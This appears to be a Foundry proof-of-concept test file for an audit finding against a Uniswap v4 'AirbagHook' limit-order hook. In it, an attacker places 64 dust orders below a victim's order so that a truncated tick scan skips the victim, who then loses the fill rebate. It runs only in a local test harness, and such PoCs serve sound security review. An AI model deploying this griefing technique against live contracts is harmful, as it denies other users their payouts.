// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {HookMiner} from "v4-periphery/test/shared/HookMiner.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {AirbagHook} from "../src/AirbagHook.sol";
import {AirbagOrders} from "../src/AirbagOrders.sol";

contract ZzScanTruncPoC is Test, Deployers {
    using StateLibrary for IPoolManager;

    AirbagHook internal hook;
    address internal victim = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();
        uint160 flags =
            uint160(Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        (address predicted, bytes32 salt) =
            HookMiner.find(address(this), flags, type(AirbagHook).creationCode, abi.encode(address(manager)));
        hook = new AirbagHook{salt: salt}(manager);
        assertEq(address(hook), predicted);

        (key,) = initPoolAndAddLiquidity(currency0, currency1, IHooks(address(hook)), 3000, SQRT_PRICE_1_1);

        modifyLiquidityRouter.modifyLiquidity(
            key,
            ModifyLiquidityParams({tickLower: -12000, tickUpper: 12000, liquidityDelta: 5_000e18, salt: bytes32(0)}),
            ""
        );

        deal(Currency.unwrap(currency0), address(this), 500_000 ether);
        deal(Currency.unwrap(currency1), address(this), 500_000 ether);

        _fund(victim);
        _fund(attacker);
    }

    function _fund(address who) internal {
        deal(Currency.unwrap(currency0), who, 100_000 ether);
        deal(Currency.unwrap(currency1), who, 100_000 ether);
        vm.startPrank(who);
        IERC20(Currency.unwrap(currency0)).approve(address(hook), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).approve(address(hook), type(uint256).max);
        vm.stopPrank();
    }

    function _pushTo(int24 targetTick) internal {
        (, int24 cur,,) = manager.getSlot0(key.toId());
        if (targetTick == cur) return;
        bool up = targetTick > cur;
        swapRouter.swap(
            key,
            SwapParams({
                zeroForOne: !up,
                amountSpecified: -400_000 ether,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(targetTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    int24 constant VICTIM_TICK = 3900; // upper edge 3960
    int24 constant TARGET = 4200;

    /// Baseline: no shield. Victim must be filled and paid.
    function test_baseline_victimIsPaid() public {
        vm.prank(victim);
        uint256 vid = hook.createOrder(key, VICTIM_TICK, 1e18);

        _pushTo(TARGET);

        (, int24 post,,) = manager.getSlot0(key.toId());
        console2.log("baseline postTick", post);
        AirbagOrders.Order memory o = hook.orderOf(vid);
        console2.log("baseline filled", o.filled);
        console2.log("baseline rebate1", o.rebate1);
        console2.log("baseline rebate0", o.rebate0);
        assertTrue(o.filled, "baseline: victim must be filled");
        assertTrue(o.rebate0 != 0 || o.rebate1 != 0, "baseline: victim must be paid");
    }

    /// Shield: 64 dust orders on the 64 spacings between spot and the victim.
    function test_shield_starvesVictim() public {
        vm.prank(victim);
        uint256 vid = hook.createOrder(key, VICTIM_TICK, 1e18);

        // 64 initialized ticks: 60, 120, ... 3840 — all strictly below the victim's tick.
        uint256 gasBefore = gasleft();
        for (int24 i = 1; i <= 64; ++i) {
            vm.prank(attacker, attacker);
            hook.createOrder(key, i * 60, 1);
        }
        console2.log("gas to build shield", gasBefore - gasleft());

        _pushTo(TARGET);

        (, int24 post,,) = manager.getSlot0(key.toId());
        console2.log("shielded postTick", post);
        assertGe(post, VICTIM_TICK + 60, "market must clear the victim's range");

        AirbagOrders.Order memory o = hook.orderOf(vid);
        console2.log("shielded filled", o.filled);
        console2.log("shielded rebate0", o.rebate0);
        console2.log("shielded rebate1", o.rebate1);
        assertFalse(o.filled, "PoC: victim skipped by scan truncation");
        assertEq(o.rebate0, 0);
        assertEq(o.rebate1, 0);
    }

    /// After the shield, is the victim reachable again by any later rising swap?
    function test_shield_noCatchUp() public {
        vm.prank(victim);
        uint256 vid = hook.createOrder(key, VICTIM_TICK, 1e18);
        for (int24 i = 1; i <= 64; ++i) {
            vm.prank(attacker, attacker);
            hook.createOrder(key, i * 60, 1);
        }
        _pushTo(TARGET);
        assertFalse(hook.orderOf(vid).filled);

        // Later, larger rising swaps in later blocks.
        vm.roll(block.number + 1);
        _pushTo(5000);
        vm.roll(block.number + 1);
        _pushTo(6000);
        AirbagOrders.Order memory o = hook.orderOf(vid);
        console2.log("after later rises, filled", o.filled);
        assertFalse(o.filled, "no catch-up path exists");

        // But the maker can still recover the converted position via cancelOrder.
        uint256 b1 = IERC20(Currency.unwrap(currency1)).balanceOf(victim);
        vm.prank(victim);
        hook.cancelOrder(vid, key);
        uint256 got = IERC20(Currency.unwrap(currency1)).balanceOf(victim) - b1;
        console2.log("cancel recovered currency1", got);
        assertGt(got, 0, "principal is recoverable, only the rebate is lost");
    }
    function test_retraceCanRefill() public {
        vm.prank(victim);
        uint256 vid = hook.createOrder(key, VICTIM_TICK, 1e18);
        for (int24 i = 1; i <= 64; ++i) { vm.prank(attacker, attacker); hook.createOrder(key, i * 60, 1); }
        _pushTo(TARGET);
        assertFalse(hook.orderOf(vid).filled, "skipped");
        vm.roll(block.number + 1);
        _pushTo(3000);           // market retraces below the victim's range
        vm.roll(block.number + 1);
        _pushTo(4500);           // and rises through it again
        AirbagOrders.Order memory o = hook.orderOf(vid);
        console2.log("after retrace filled", o.filled);
        console2.log("after retrace rebate0", o.rebate0);
        console2.log("after retrace rebate1", o.rebate1);
    }
}
